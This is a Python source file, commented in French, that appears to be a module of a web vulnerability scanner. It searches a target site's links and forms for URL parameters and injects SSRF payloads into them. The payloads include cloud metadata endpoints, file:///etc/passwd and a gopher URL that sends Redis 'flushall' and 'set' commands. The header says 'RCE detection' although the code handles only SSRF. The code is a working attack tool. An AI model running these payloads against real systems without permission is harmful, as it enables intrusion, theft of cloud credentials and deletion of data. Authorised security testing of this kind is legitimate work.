# Détection des RCE

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

from pprint import pprint

#  Liste des paramètres suspects liés aux URL (potentiellement vulnérables à SSRF)
SSRF_KEYS = [
    "url", "redirect", "next", "dest", "destination", "link", "site", "path",
    "fetch", "load", "proxy", "image", "img", "file", "callback", "to", "forward",
    "URL", "Redirect", "Next", "Dest", "Destination", "Link", "Site", "Path",
    "Fetch", "Load", "Proxy", "Image", "Img", "File", "Callback", "To", "Forward"
]

#  Cibles pour tester SSRF
SSRF_TEST_URLS = [
    "http://localhost:80",
    "http://127.0.0.1:80",
    "http://169.254.169.254/latest/meta-data/",  # AWS Metadata
    "http://169.254.169.254", # AWS Metadata
    "http://metadata.google.internal/computeMetadata/v1/", # Google Cloud Metadata
    "http://100.100.100.200/latest/meta-data/", # Azure Metadata
    "http://0.0.0.0:80",
    "http://internal.server.local",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%243%0D%0Axxx%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A", # Redis Gopher
    "dict://127.0.0.1:11211/stat" # Memcached Dict
]

def find_ssrf_in_urls(target, session=None):
    """Analyse les liens pour détecter les paramètres SSRF potentiels."""
    print(f"[!]~] Recherche de paramètres SSRF dans {target}...")
    if not session:
        session = requests.Session()
    session.verify = False
    try:
        response = session.get(target, timeout=5)
        soup = BeautifulSoup(response.text, 'lxml')
        
        detected_params = []
        for link in soup.find_all('a', href=True):
            url = link['href']
            parsed_url = urlparse(url)
            if parsed_url.query:
                params = parsed_url.query.split("&")
                for param in params:
                    name = param.split("=")[0]
                    if name in SSRF_KEYS:
                        detected_params.append({"url": urljoin(target, url), "param": name})
                        print(f"[!!!] SSRF potentiel détecté dans {urljoin(target, url)}")
        return detected_params
    except requests.exceptions.RequestException as e:
        # print(f"❌ Erreur lors de la requête : {e}\n")
        return []

def find_ssrf_in_forms(target, session=None):
    """Recherche les formulaires contenant des champs susceptibles d’être vulnérables à SSRF."""
    print(f"[!]~] Recherche de formulaires SSRF dans {target}...")
    if not session:
        session = requests.Session()
    session.verify = False
    try:
        response = session.get(target, timeout=5)
        soup = BeautifulSoup(response.text, 'lxml')
        
        detected_forms = []
        for form in soup.find_all('form'):
            action = form.attrs.get("action", "").strip()
            method = form.attrs.get("method", "get").lower()
            inputs = {input_tag.attrs.get("name"): input_tag.attrs.get("value", "") for input_tag in form.find_all("input") if input_tag.attrs.get("name")}
            if any(param in inputs for param in SSRF_KEYS):
                detected_forms.append({"action": urljoin(target, action) if action else target, "method": method, "inputs": inputs})
                print(f"[!!!] SSRF potentiel détecté dans {urljoin(target, action)}")
        return detected_forms
    except requests.exceptions.RequestException as e:
        # print(f"❌ Erreur lors de la requête : {e}\n")
        return []

def test_ssrf(target_url, param, method="get", session=None):
    """Injecte des URLs malveillantes pour tester SSRF."""
    print(f"[!]~] Test SSRF sur {target_url}...")
    if not session:
        session = requests.Session()
    session.verify = False
    for test_url in SSRF_TEST_URLS:
        test_payload = f"{target_url}&{param}={test_url}" if "?" in target_url else f"{target_url}?{param}={test_url}"
        try:
            if method == "get":
                response = session.get(test_payload, timeout=5, allow_redirects=False)
            else:
                response = session.post(target_url, data={param: test_url}, timeout=5, allow_redirects=False)
            
            if "root:x:0:0" in response.text or "EC2Metadata" in response.text or "127.0.0.1" in response.text or "ComputeMetadata" in response.text or "100.100.100.200" in response.text:
                print(f"[!!!] SSRF détectée sur {test_payload}!")
                return {"url": test_payload, "ssrf_exploitable": True}
            if response.status_code == 301 or response.status_code == 302:
                print(f"[!]~] Redirection détectée sur {test_payload} (Code {response.status_code}). Vérifiez manuellement.")
                return {"url": test_payload, "ssrf_exploitable": "Redirection"}
        except requests.exceptions.RequestException as e:
            # print(f"❌ Erreur lors de la requête SSRF : {e}")
            pass
    return None

def scan_ssrf(target, formated_target, session=None):
    """Exécute un scan SSRF sur l'URL cible."""
    print(f"\n\t==============Scan SSRF sur -->{formated_target}<--  ==============\n")
    results = {"urls": [], "forms": []}
    
    # 1️⃣ Recherche de paramètres SSRF dans les URLs
    urls_with_ssrf = find_ssrf_in_urls(target, session)
    if urls_with_ssrf:
        print("[!]~] Test SSRF sur les URLs...")
        for item in urls_with_ssrf:
            result = test_ssrf(item["url"], item["param"], "get", session)
            if result:
                results["urls"].append(result)
    
    # 2️⃣ Recherche de champs SSRF dans les formulaires
    forms_with_ssrf = find_ssrf_in_forms(target, session)
    if forms_with_ssrf:
        print("[!]~] Test SSRF sur les formulaires...")
        for form in forms_with_ssrf:
            action = form["action"]
            method = form["method"]
            for input_name, input_value in form["inputs"].items():
                result = test_ssrf(action, input_name, method, session)
                if result:
                    results["forms"].append(result)
    
    
    if results["urls"]:
        print("[+] Résultats des tests SSRF sur les URLs :")
        for result in results["urls"]:
            print(f" - URL: {result['url']}, Exploitable: {result['ssrf_exploitable']}")
    else:
        print("[-] Aucun paramètre SSRF détecté dans les URLs.")
    
    if results["forms"]:
        print("[+] Résultats des tests SSRF sur les formulaires :")
        for result in results["forms"]:
            print(f" - Form Action: {result['url']}, Exploitable: {result['ssrf_exploitable']}")
    else:
        print("[-] Aucun champ SSRF détecté dans les formulaires.")
  
    print("[!][~]")
    print("[!][~]")
    pprint(results)
    
    print("\n✅ Scan SSRF terminé.\n")
      
    return results
